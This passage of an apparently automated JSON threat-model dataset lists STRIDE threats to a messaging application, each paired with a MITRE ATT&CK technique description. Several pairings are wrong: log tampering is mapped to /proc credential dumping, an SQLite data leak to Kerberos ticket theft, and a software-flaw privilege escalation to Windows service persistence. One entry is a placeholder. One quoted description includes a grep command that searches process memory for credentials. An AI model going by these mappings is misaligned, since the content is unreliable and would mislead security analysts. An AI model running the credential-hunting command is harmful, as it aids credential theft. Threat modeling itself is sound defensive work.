        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a software vulnerability within the application to trigger a crash, continually causing the application to become unavailable.",
            "Assumptions": [
                {
                    "Assumption": "Presence of vulnerable code in the application",
                    "Role": "Developer",
                    "Condition": "Unpatched software or code flaws"
                },
                {
                    "Assumption": "Attacker has identified and can exploit this vulnerability",
                    "Role": "Attacker",
                    "Condition": "Advanced technical knowledge and reconnaissance capabilities"
                },
                {
                    "Assumption": "No automated recovery or failover mechanisms in place",
                    "Role": "System Administrator",
                    "Condition": "Lack of resilience strategies"
                }
            ],
            "Potential Impact": "Repeated application crashes result in service unavailability.",
            "MITRE ATT&CK Keywords": [
                "Software Vulnerability",
                "Denial of Service",
                "Application Crash",
                "Availability"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An adversary continuously floods the messaging server with authentication requests, exhausting server resources and preventing legitimate access.",
            "Assumptions": [
                {
                    "Assumption": "Authentication mechanisms are susceptible to flooding attacks",
                    "Role": "Developer",
                    "Condition": "Inefficient authentication handling or rate-limiting policies"
                },
                {
                    "Assumption": "The server does not implement measures to differentiate between legitimate and illegitimate requests",
                    "Role": "Network Administrator",
                    "Condition": "Lack of IP blacklisting or CAPTCHA mechanisms"
                },
                {
                    "Assumption": "Attacker has the capability to generate a high volume of requests",
                    "Role": "Attacker",
                    "Condition": "Access to automated tools or botnets"
                }
            ],
            "Potential Impact": "Exhaustion of server resources, leading to denial of service for legitimate users.",
            "MITRE ATT&CK Keywords": [
                "Authentication Flooding",
                "Server Resources",
                "Denial of Service",
                "Availability"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages an unpatched vulnerability in the application to escalate their privileges from a standard user to an administrative user.",
            "Assumptions": [
                {
                    "Assumption": "Application contains a privilege escalation vulnerability",
                    "Role": "Developer",
                    "Condition": "Unpatched software or inherent code flaw"
                },
                {
                    "Assumption": "Attacker has a standard user account or compromised credentials",
                    "Role": "Attacker",
                    "Condition": "Credential theft or phishing"
                },
                {
                    "Assumption": "No effective monitoring of privilege escalations",
                    "Role": "System Administrator",
                    "Condition": "Lack of real-time security monitoring"
                }
            ],
            "Potential Impact": "Unauthorized administrative access leading to full system compromise.",
            "MITRE ATT&CK Keywords": [
                "Privilege Escalation",
                "Vulnerability",
                "Elevation of Privilege",
                "Administrative Access"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious software exploits security loopholes in the desktop client, silently escalating its privileges to gain broader system control.",
            "Assumptions": [
                {
                    "Assumption": "Security loopholes exist within the desktop client",
                    "Role": "Developer",
                    "Condition": "Unpatched software or inherent code flaw"
                },
                {
                    "Assumption": "Device is infected with malware",
                    "Role": "Attacker",
                    "Condition": "Successful malware delivery and execution"
                },
                {
                    "Assumption": "Insufficient controls to prevent privilege escalation",
                    "Role": "Application Security",
                    "Condition": "Weak access control measures"
                }
            ],
            "Potential Impact": "Complete control over the affected system, leading to unauthorized actions and data access.",
            "MITRE ATT&CK Keywords": [
                "Malware",
                "Privilege Escalation",
                "Elevation of Privilege",
                "Desktop Client"
            ],
            "mitre_technique": {
                "name": "Extra Window Memory Injection",
                "description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "id": "attack-pattern--0042a9f5-f053-4769-b3ef-9ad018dfa298",
                "technique_id": "T1055.011"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A local unprivileged user exploits a known vulnerability in the OS of the companion device to gain unauthorized administrative access.",
            "Assumptions": [
                {
                    "Assumption": "Operating system vulnerability remains unpatched",
                    "Role": "System Administrator",
                    "Condition": "Delayed patch management"
                },
                {
                    "Assumption": "Attacker has local access to the companion device",
                    "Role": "Attacker",
                    "Condition": "Physical or logical access to the device"
                },
                {
                    "Assumption": "No additional privilege management controls in place",
                    "Role": "System Security",
                    "Condition": "Lack of application of the principle of least privilege"
                }
            ],
            "Potential Impact": "Unauthorized administrative control over the companion device, leading to system-wide changes and potential compromise.",
            "MITRE ATT&CK Keywords": [
                "OS Vulnerability",
                "Privilege Escalation",
                "Elevation of Privilege",
                "Companion Device"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "25",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a fake Wi-Fi hotspot named after a legitimate public network to intercept and capture initial login attempts to the messaging applications.",
            "Assumptions": [
                {
                    "Assumption": "Users are within the range of the fake Wi-Fi hotspot.",
                    "Role": "End-user",
                    "Condition": "When accessing the internet in public places."
                },
                {
                    "Assumption": "The messaging application does not have a verification mechanism to detect a bogus network.",
                    "Role": "Application Developer",
                    "Condition": "In the absence of advanced network verification features."
                },
                {
                    "Assumption": "The attacker has the technical capability to set up and operate such a hotspot.",
                    "Role": "Attacker",
                    "Condition": "With access to necessary equipment and software knowledge."
                }
            ],
            "Potential Impact": "Unauthorized data capture leading to information disclosure and potential spoofing attacks.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "Wi-Fi",
                "man-in-the-middle"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake desktop client that appears to be a legitimate messaging app, tricking users into entering their identity keys.",
            "Assumptions": [
                {
                    "Assumption": "Users download and use the fake desktop client without verifying its authenticity.",
                    "Role": "End-user",
                    "Condition": "When downloading applications from non-trusted sources."
                },
                {
                    "Assumption": "The fake client can successfully mimic the UI/UX of the legitimate application.",
                    "Role": "Attacker",
                    "Condition": "With access to design and development resources to create a believable fake."
                },
                {
                    "Assumption": "Security warnings and checks in the operating system are not triggered or are ignored by the user.",
                    "Role": "End-user",
                    "Condition": "When overriding security warnings."
                }
            ],
            "Potential Impact": "Compromise of sensitive authentication credentials leading to potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "phishing",
                "UI redress"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.\n\nAdversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\").(Citation: CISA IDN ST05-016) URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)\n\nAdversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: Trend Micro Pawn Storm OAuth 2017) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. (Citation: Microsoft OAuth 2.0 Consent Phishing 2021)\n\nAdversaries may also utilize spearphishing links to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s that grant immediate access to the victim environment. For example, a user may be lured through \u201cconsent phishing\u201d into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .(Citation: Trend Micro Pawn Storm OAuth 2017)(Citation: Microsoft OAuth 2.0 Consent Phishing 2021)\n\nSimilarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as \u201cdevice code phishing,\u201d an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.(Citation: SecureWorks Device Code Phishing 2021)(Citation: Netskope Device Code Phishing 2021)(Citation: Optiv Device Code Phishing 2021)",
                "id": "attack-pattern--2b742742-28c3-4e1b-bab7-8350d6300fa7",
                "technique_id": "T1566.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a previously compromised device to impersonate the authenticated user on the messaging platform.",
            "Assumptions": [
                {
                    "Assumption": "A device used for messaging has been compromised by malware.",
                    "Role": "End-user",
                    "Condition": "When infected through other attacks."
                },
                {
                    "Assumption": "The attaker's malware can access and use stored private keys or identity tokens.",
                    "Role": "Attacker",
                    "Condition": "With sufficient device privileges."
                },
                {
                    "Assumption": "The messaging service does not have mechanisms to detect unauthorized device activity.",
                    "Role": "Application Developer",
                    "Condition": "In the absence of robust anomaly detection systems."
                }
            ],
            "Potential Impact": "Unauthorized access to the user\u2019s messaging account and potential information disclosure.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "identity theft",
                "malware"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies messages during transmission by exploiting weaknesses in the implementation of the encryption protocol.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has the ability to intercept network traffic between devices and the messaging service.",
                    "Role": "Attacker",
                    "Condition": "Positioned between the communicating devices, such as on the same network."
                },
                {
                    "Assumption": "There are vulnerabilities in the implementation of the encryption protocol.",
                    "Role": "Application Developer",
                    "Condition": "When encryption is not properly implemented or maintained."
                },
                {
                    "Assumption": "The recipient does not have a way to verify the integrity of received messages.",
                    "Role": "End-user",
                    "Condition": "When the application does not offer integrity verification."
                }
            ],
            "Potential Impact": "Data integrity is compromised, messages may be altered without detection.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "network",
                "encryption",
                "man-in-the-middle"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains physical access to a device and tampers with the messaging application\u2019s local database to alter stored messages.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to the device.",
                    "Role": "Attacker",
                    "Condition": "When the device is left unattended or stolen."
                },
                {
                    "Assumption": "The application's local database is not encrypted or poorly protected.",
                    "Role": "Application Developer",
                    "Condition": "In the absence of robust encryption and security measures."
                },
                {
                    "Assumption": "There are no mechanisms for detecting unauthorized database modifications.",
                    "Role": "End-user",
                    "Condition": "When the application does not support or implement database integrity checks."
                }
            ],
            "Potential Impact": "Corruption of stored data leading to data integrity issues.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "physical access",
                "database",
                "local storage"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker injects a malicious update into the desktop client update process, compromising all linked companion devices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can access the update distribution process.",
                    "Role": "Attacker",
                    "Condition": "Through compromised update servers or DNS spoofing."
                },
                {
                    "Assumption": "The desktop client does not adequately verify the authenticity of updates.",
                    "Role": "Application Developer",
                    "Condition": "When updates are not signed or verified correctly."
                },
                {
                    "Assumption": "Users do not manually verify update sources.",
                    "Role": "End-user",
                    "Condition": "When relying entirely on the automated update process."
                }
            ],
            "Potential Impact": "Installation of malicious software leading to system compromise.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "update process",
                "software supply chain",
                "malware injection"
            ],
            "mitre_technique": {
                "name": "Compromise Software Supply Chain",
                "description": "Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.\n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011)  ",
                "id": "attack-pattern--bd369cd9-abb8-41ce-b5bb-fff23ee86c00",
                "technique_id": "T1195.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending a message that was actually sent, taking advantage of inadequate logging and audit trails in the application.",
            "Assumptions": [
                {
                    "Assumption": "There is no comprehensive logging of message transactions.",
                    "Role": "Application Developer",
                    "Condition": "When logs are insufficient or not securely stored."
                },
                {
                    "Assumption": "The user understands how to exploit the lack of logging.",
                    "Role": "End-user",
                    "Condition": "When knowledgeable about system weaknesses."
                },
                {
                    "Assumption": "The messaging application does not provide non-repudiation features.",
                    "Role": "Application Developer",
                    "Condition": "In the absence of digitally signing messages or implementing other non-repudiation techniques."
                }
            ],
            "Potential Impact": "Data integrity is questioned, and accountability is compromised.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "audit trail",
                "non-repudiation"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker manipulates log files to cover their tracks after unauthorized access to the messaging platform.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has filesystem access to tamper with log files.",
                    "Role": "Attacker",
                    "Condition": "With sufficient privileges on the compromised system."
                },
                {
                    "Assumption": "Log files are not protected against unauthorized modification.",
                    "Role": "Application Developer",
                    "Condition": "When logs are stored without security controls."
                },
                {
                    "Assumption": "There is no real-time integrity monitoring of log files.",
                    "Role": "System Administrator",
                    "Condition": "In the absence of log monitoring and alerting systems."
                }
            ],
            "Potential Impact": "Loss of accountability and potential evasion of detection.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log manipulation",
                "filesystem",
                "forensic evasion"
            ],
            "mitre_technique": {
                "name": "Proc Filesystem",
                "description": "Adversaries may gather credentials from the proc filesystem or `/proc`. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the `/proc/<PID>/maps` file shows how memory is mapped within the process\u2019s virtual address space. And `/proc/<PID>/mem`, exposed for debugging purposes, provides access to the process\u2019s virtual address space.(Citation: Picus Labs Proc cump 2022)(Citation: baeldung Linux proc map 2022)\n\nWhen executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns indicative of credentials. Adversaries may use regex patterns, such as <code>grep -E \"^[0-9a-f-]* r\" /proc/\"$pid\"/maps | cut -d' ' -f 1</code>, to look for fixed strings in memory structures or cached hashes.(Citation: atomic-red proc file system) When running without privileged access, processes can still view their own virtual memory locations. Some services or programs may save credentials in clear text inside the process\u2019s memory.(Citation: MimiPenguin GitHub May 2017)(Citation: Polop Linux PrivEsc Gitbook)\n\nIf running as or with the permissions of a web browser, a process can search the `/maps` & `/mem` locations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located.",
                "id": "attack-pattern--3120b9fa-23b8-4500-ae73-09494f607b7d",
                "technique_id": "T1003.007"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A disgruntled user denies receiving critical messages by deleting them and claiming they never arrived.",
            "Assumptions": [
                {
                    "Assumption": "Messaging application does not maintain a secure and immutable record of received messages.",
                    "Role": "Application Developer",
                    "Condition": "When lacking features for message receipt confirmation and audit."
                },
                {
                    "Assumption": "User has the ability to delete messages without any checks or logs.",
                    "Role": "End-user",
                    "Condition": "When using features that allow message deletion."
                },
                {
                    "Assumption": "There is no backup or alternate record of message delivery.",
                    "Role": "System Administrator",
                    "Condition": "In the absence of backup or message status confirmation systems."
                }
            ],
            "Potential Impact": "Integrity of communication is compromised and disputes over message delivery arise.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "message deletion",
                "audit trail",
                "message receipt"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the SQLite database, gaining unauthorized access to stored encryption keys and user data.",
            "Assumptions": [
                {
                    "Assumption": "There are unpatched vulnerabilities in the SQLite database.",
                    "Role": "Application Developer",
                    "Condition": "When using outdated or unpatched database systems."
                },
                {
                    "Assumption": "The attacker has access to the device or system where the database is stored.",
                    "Role": "Attacker",
                    "Condition": "Locally or via remote access vulnerabilities."
                },
                {
                    "Assumption": "Stored data is not encrypted or insufficiently protected.",
                    "Role": "Application Developer",
                    "Condition": "When lacking proper encryption and access controls."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive user data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "database",
                "SQLite",
                "data exfiltration"
            ],
            "mitre_technique": {
                "name": "Steal or Forge Kerberos Tickets",
